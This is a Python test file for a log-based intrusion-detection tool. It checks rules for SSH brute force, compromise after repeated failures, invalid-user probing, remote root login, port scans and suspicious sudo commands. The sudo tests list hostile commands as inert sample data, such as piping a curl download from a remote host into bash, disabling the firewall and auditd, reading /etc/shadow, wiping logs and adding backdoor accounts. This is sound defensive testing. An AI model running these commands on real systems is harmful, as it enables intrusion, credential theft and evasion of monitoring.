"""Tests for the individual detection rules (synthetic events only)."""

from dataclasses import dataclass

import pytest

from conftest import at, failed_ssh, invalid_user_ssh, make_event, successful_ssh, sudo_event
from sentinelforge.models.event import EventType, SecurityEvent, Severity
from sentinelforge.detection.rules import (
    InvalidUserProbeRule,
    PortScanRule,
    RemotePrivilegedLoginRule,
    RepeatedAuthFailureRule,
    SshBruteForceRule,
    SshCompromiseSuspectedRule,
    SuspiciousSudoRule,
)


# ==========================================================================
# SSH_BRUTE_FORCE
# ==========================================================================
class TestSshBruteForce:
    def test_four_failures_do_not_alert(self):
        events = [failed_ssh(i * 20) for i in range(4)]
        assert list(SshBruteForceRule().evaluate(events)) == []

    def test_five_failures_alert(self, brute_force_events):
        detections = list(SshBruteForceRule().evaluate(brute_force_events))
        assert len(detections) == 1
        assert detections[0].source_ip == "192.168.1.50"
        assert detections[0].user == "root"

    def test_failures_spread_outside_the_window_do_not_alert(self):
        # Five failures, but ten minutes apart: never five within five minutes.
        events = [failed_ssh(i * 600) for i in range(5)]
        assert list(SshBruteForceRule().evaluate(events)) == []

    def test_different_source_ips_are_not_correlated(self):
        # Three failures from each of two addresses: neither reaches five.
        events = [failed_ssh(i * 20, src_ip="192.168.1.50") for i in range(3)]
        events += [failed_ssh(i * 20 + 5, src_ip="10.0.0.9") for i in range(3)]
        assert list(SshBruteForceRule().evaluate(events)) == []

    def test_each_attacking_ip_gets_its_own_detection(self):
        events = [failed_ssh(i * 20, src_ip="192.168.1.50") for i in range(5)]
        events += [failed_ssh(i * 20 + 5, src_ip="10.0.0.9") for i in range(5)]
        detections = list(SshBruteForceRule().evaluate(events))
        assert sorted(d.source_ip for d in detections) == ["10.0.0.9", "192.168.1.50"]

    def test_evidence_contains_every_triggering_event(self, brute_force_events):
        detection = next(iter(SshBruteForceRule().evaluate(brute_force_events)))
        assert detection.evidence == brute_force_events
        assert all(e.event_type == EventType.AUTHENTICATION_FAILURE for e in detection.evidence)

    def test_a_long_attack_produces_one_detection_not_one_per_event(self):
        events = [failed_ssh(i * 10) for i in range(30)]
        detections = list(SshBruteForceRule().evaluate(events))
        assert len(detections) == 1
        assert len(detections[0].evidence) == 30

    def test_threshold_and_window_are_configurable(self):
        events = [failed_ssh(i * 20) for i in range(3)]
        assert list(SshBruteForceRule(threshold=3).evaluate(events))
        assert not list(SshBruteForceRule(threshold=4).evaluate(events))

        spread = [failed_ssh(i * 120) for i in range(5)]  # 8 minutes total
        assert not list(SshBruteForceRule().evaluate(spread))
        assert list(SshBruteForceRule(window_seconds=900).evaluate(spread))

    def test_non_authentication_events_are_ignored(self):
        events = [
            make_event(i * 10, event_type=EventType.SSH_CONNECTION, src_ip="192.168.1.50")
            for i in range(10)
        ]
        assert list(SshBruteForceRule().evaluate(events)) == []

    def test_failures_without_a_source_ip_are_ignored(self):
        events = [
            make_event(
                i * 10,
                event_type=EventType.AUTHENTICATION_FAILURE,
                user="root",
                message="authentication failure",
            )
            for i in range(10)
        ]
        assert list(SshBruteForceRule().evaluate(events)) == []

    def test_non_ssh_services_are_ignored(self):
        events = [
            make_event(
                i * 10,
                event_type=EventType.AUTHENTICATION_FAILURE,
                process="gdm-password",
                user="capslock",
                src_ip="192.168.1.50",
                message="authentication failure",
            )
            for i in range(10)
        ]
        assert list(SshBruteForceRule().evaluate(events)) == []

    def test_high_volume_adds_an_explained_risk_factor(self):
        detection = next(iter(SshBruteForceRule().evaluate([failed_ssh(i * 5) for i in range(20)])))
        assert any("far above the threshold" in f.reason for f in detection.risk_factors)

    def test_events_with_unparseable_timestamps_are_skipped_not_fatal(self):
        events = [failed_ssh(i * 20) for i in range(5)]
        events.append(failed_ssh(100))
        events[-1].timestamp = "not-a-timestamp"
        detections = list(SshBruteForceRule().evaluate(events))
        assert len(detections) == 1
        assert len(detections[0].evidence) == 5


# ==========================================================================
# SSH_COMPROMISE_SUSPECTED
# ==========================================================================
class TestSshCompromiseSuspected:
    def test_success_after_five_failures_alerts(self, brute_force_events):
        events = brute_force_events + [successful_ssh(120)]
        detections = list(SshCompromiseSuspectedRule().evaluate(events))
        assert len(detections) == 1
        assert detections[0].source_ip == "192.168.1.50"
        assert detections[0].user == "root"

    def test_evidence_includes_the_failures_and_the_success(self, brute_force_events):
        success = successful_ssh(120)
        detection = next(iter(SshCompromiseSuspectedRule().evaluate(brute_force_events + [success])))
        assert detection.evidence[:-1] == brute_force_events
        assert detection.evidence[-1] is success
        assert detection.evidence[-1].event_type == EventType.AUTHENTICATION_SUCCESS

    def test_too_few_failures_before_the_success_do_not_alert(self):
        events = [failed_ssh(i * 20) for i in range(4)] + [successful_ssh(120)]
        assert list(SshCompromiseSuspectedRule().evaluate(events)) == []

    def test_success_from_a_different_ip_is_not_correlated(self, brute_force_events):
        events = brute_force_events + [successful_ssh(120, src_ip="10.0.0.9", user="capslock")]
        assert list(SshCompromiseSuspectedRule().evaluate(events)) == []

    def test_success_before_the_failures_does_not_alert(self, brute_force_events):
        events = [successful_ssh(-60)] + brute_force_events
        assert list(SshCompromiseSuspectedRule().evaluate(events)) == []

    def test_success_long_after_the_failures_does_not_alert(self, brute_force_events):
        events = brute_force_events + [successful_ssh(5000)]
        assert list(SshCompromiseSuspectedRule().evaluate(events)) == []

    def test_several_logins_during_one_attack_report_once(self, brute_force_events):
        events = brute_force_events + [successful_ssh(120), successful_ssh(140), successful_ssh(160)]
        assert len(list(SshCompromiseSuspectedRule().evaluate(events))) == 1

    def test_it_carries_an_escalating_risk_factor(self, brute_force_events):
        detection = next(
            iter(SshCompromiseSuspectedRule().evaluate(brute_force_events + [successful_ssh(120)]))
        )
        assert sum(f.points for f in detection.risk_factors) == 15


# ==========================================================================
# SUSPICIOUS_SUDO
# ==========================================================================
class TestSuspiciousSudo:
    @pytest.mark.parametrize(
        "command",
        [
            "/usr/bin/dnf update",
            "/usr/bin/dnf install @virtualization",
            "/bin/systemctl restart httpd",
            "/usr/bin/vim /etc/hosts",
            "/bin/ls -l /root",
            "/usr/bin/journalctl -u sshd",
            "/usr/bin/tail -f /var/log/messages",
            "/usr/bin/firewall-cmd --list-all",
        ],
    )
    def test_normal_administration_does_not_alert(self, command):
        assert list(SuspiciousSudoRule().evaluate([sudo_event(0, command)])) == []

    @pytest.mark.parametrize(
        "command,expected_technique,expected_severity",
        [
            ("/usr/bin/curl http://198.51.100.9/x.sh | bash", "T1105", Severity.HIGH),
            ("/bin/systemctl stop firewalld", "T1562.004", Severity.HIGH),
            ("/usr/sbin/iptables -F", "T1562.004", Severity.HIGH),
            ("/bin/systemctl stop auditd", "T1562.001", Severity.HIGH),
            ("/usr/sbin/setenforce 0", "T1562.001", Severity.HIGH),
            ("/usr/bin/tee /etc/sudoers.d/backdoor", "T1556", Severity.HIGH),
            ("/usr/sbin/usermod -aG wheel mallory", "T1098", Severity.HIGH),
            ("/bin/rm -rf /var/log/secure", "T1070.002", Severity.HIGH),
            ("/usr/bin/cat /etc/shadow", "T1003.008", Severity.MEDIUM),
            ("/usr/sbin/useradd backdoor", "T1098", Severity.MEDIUM),
            ("/bin/bash -c 'id > /tmp/x'", "T1059.004", Severity.MEDIUM),
            ("/bin/bash", "T1059.004", Severity.LOW),
        ],
    )
    def test_suspicious_commands_alert_with_the_right_mapping(
        self, command, expected_technique, expected_severity
    ):
        detections = list(SuspiciousSudoRule().evaluate([sudo_event(0, command)]))
        assert len(detections) == 1, command
        detection = detections[0]
        assert detection.severity == expected_severity
        ids = (detection.mitre.sub_technique_id, detection.mitre.technique_id)
        assert expected_technique in ids

    def test_unauthorized_sudo_attempt_alerts(self):
        event = make_event(
            0,
            event_type=EventType.SUDO,
            process="sudo",
            user="mallory",
            message="mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
        )
        detection = next(iter(SuspiciousSudoRule().evaluate([event])))
        assert detection.severity == Severity.HIGH
        assert detection.mitre.sub_technique_id == "T1548.003"

    def test_the_triggering_event_is_kept_as_evidence(self):
        event = sudo_event(0, "/bin/systemctl stop firewalld")
        detection = next(iter(SuspiciousSudoRule().evaluate([event])))
        assert detection.evidence == [event]
        assert "systemctl stop firewalld" in detection.description

    def test_non_sudo_events_are_ignored(self, brute_force_events):
        assert list(SuspiciousSudoRule().evaluate(brute_force_events)) == []

    def test_command_text_is_never_executed(self, tmp_path):
        """A command in a log is inert text, even if it looks dangerous."""
        marker = tmp_path / "should-not-exist"
        event = sudo_event(0, f"/bin/bash -c 'touch {marker}'")
        list(SuspiciousSudoRule().evaluate([event]))
        assert not marker.exists()

    def test_different_users_deduplicate_separately(self):
        events = [
            sudo_event(0, "/bin/systemctl stop firewalld", user="capslock"),
            sudo_event(10, "/bin/systemctl stop firewalld", user="mallory"),
        ]
        keys = {d.dedup_key for d in SuspiciousSudoRule().evaluate(events)}
        assert len(keys) == 2


# ==========================================================================
# AUTH_INVALID_USER / AUTH_REPEATED_FAILURES / AUTH_ROOT_LOGIN_REMOTE
# ==========================================================================
class TestSuspiciousAuth:
    def test_three_nonexistent_accounts_from_one_source_alert(self):
        events = [
            invalid_user_ssh(0, "203.0.113.7", "admin"),
            invalid_user_ssh(10, "203.0.113.7", "oracle"),
            invalid_user_ssh(20, "203.0.113.7", "test"),
        ]
        detections = list(InvalidUserProbeRule().evaluate(events))
        assert len(detections) == 1
        assert detections[0].source_ip == "203.0.113.7"
        assert len(detections[0].evidence) == 3

    def test_the_same_nonexistent_account_retried_is_not_a_probe(self):
        events = [invalid_user_ssh(i * 10, "203.0.113.7", "admin") for i in range(5)]
        assert list(InvalidUserProbeRule().evaluate(events)) == []

    def test_two_nonexistent_accounts_stay_below_the_threshold(self):
        events = [
            invalid_user_ssh(0, "203.0.113.7", "admin"),
            invalid_user_ssh(10, "203.0.113.7", "oracle"),
        ]
        assert list(InvalidUserProbeRule().evaluate(events)) == []

    def test_ordinary_failures_for_real_users_are_not_probes(self):
        events = [failed_ssh(i * 10, user=name) for i, name in enumerate(["a", "b", "c", "d"])]
        assert list(InvalidUserProbeRule().evaluate(events)) == []

    def test_public_source_adds_a_risk_factor(self):
        events = [invalid_user_ssh(i * 10, "203.0.113.7", u) for i, u in enumerate("xyz")]
        detection = next(iter(InvalidUserProbeRule().evaluate(events)))
        assert any("outside internal network" in f.reason for f in detection.risk_factors)

    def test_repeated_failures_for_one_account_alert(self):
        events = [failed_ssh(i * 20, src_ip=None, user="capslock") for i in range(10)]
        for event in events:  # local console failures have no source address
            event.src_ip = None
        detections = list(RepeatedAuthFailureRule().evaluate(events))
        assert len(detections) == 1
        assert detections[0].user == "capslock"
        assert len(detections[0].evidence) == 10

    def test_nine_failures_stay_below_the_threshold(self):
        events = [failed_ssh(i * 20, user="capslock") for i in range(9)]
        assert list(RepeatedAuthFailureRule().evaluate(events)) == []

    def test_failures_for_different_accounts_are_not_summed(self):
        events = [failed_ssh(i * 10, user="alice") for i in range(6)]
        events += [failed_ssh(i * 10 + 5, user="bob") for i in range(6)]
        assert list(RepeatedAuthFailureRule().evaluate(events)) == []

    def test_distributed_failures_add_a_risk_factor(self):
        events = [
            failed_ssh(i * 10, src_ip=f"10.0.0.{i % 4}", user="root") for i in range(12)
        ]
        detection = next(iter(RepeatedAuthFailureRule().evaluate(events)))
        assert any("different source addresses" in f.reason for f in detection.risk_factors)
        assert any("privileged" in f.reason for f in detection.risk_factors)

    def test_remote_root_login_alerts(self):
        detections = list(RemotePrivilegedLoginRule().evaluate([successful_ssh(0, user="root")]))
        assert len(detections) == 1
        assert detections[0].user == "root"
        assert detections[0].source_ip == "192.168.1.50"

    def test_local_root_login_does_not_alert(self):
        for address in ("127.0.0.1", "::1", None):
            events = [successful_ssh(0, src_ip=address, user="root")]
            assert list(RemotePrivilegedLoginRule().evaluate(events)) == []

    def test_unprivileged_remote_login_does_not_alert(self):
        events = [successful_ssh(0, user="capslock")]
        assert list(RemotePrivilegedLoginRule().evaluate(events)) == []

    def test_public_address_escalates_the_risk(self):
        private = next(iter(RemotePrivilegedLoginRule().evaluate([successful_ssh(0, user="root")])))
        public = next(
            iter(
                RemotePrivilegedLoginRule().evaluate(
                    [successful_ssh(0, src_ip="203.0.113.7", user="root")]
                )
            )
        )
        assert private.risk_factors == []
        assert sum(f.points for f in public.risk_factors) == 10


# ==========================================================================
# PORT_SCAN - implemented but unavailable in Phase 1
# ==========================================================================
@dataclass
class NetworkEvent(SecurityEvent):
    """A future network-sensor event, used to prove the rule logic works."""

    dst_port: str | None = None


class TestPortScan:
    def test_rule_is_enabled_now_that_a_network_sensor_exists(self):
        """Phase 4 supplies dst_port, so the rule runs when the data is there."""
        assert PortScanRule().enabled is True

    def test_rule_is_skipped_with_a_reason_without_network_telemetry(self):
        rule = PortScanRule()
        assert rule.requires == ("dst_port",)
        reason = rule.unavailable_reason([failed_ssh(0)])
        assert reason and "network telemetry" in reason
        assert "ebpf-network" in reason

    def test_phase_one_events_produce_no_findings(self, brute_force_events):
        assert list(PortScanRule().evaluate(brute_force_events)) == []

    def test_logic_works_once_events_carry_destination_ports(self):
        events = [
            NetworkEvent(
                timestamp=at(i),
                host="fedora",
                source="network-sensor",
                src_ip="192.168.1.50",
                dst_port=str(port),
            )
            for i, port in enumerate([21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 8080])
        ]
        rule = PortScanRule()
        assert rule.unavailable_reason(events) is None
        detections = list(rule.evaluate(events))
        assert len(detections) == 1
        assert detections[0].source_ip == "192.168.1.50"
        assert "11 distinct destination ports" in detections[0].description

    def test_a_few_ports_are_not_a_scan(self):
        events = [
            NetworkEvent(timestamp=at(i), src_ip="192.168.1.50", dst_port=str(port))
            for i, port in enumerate([22, 80, 443])
        ]
        assert list(PortScanRule().evaluate(events)) == []
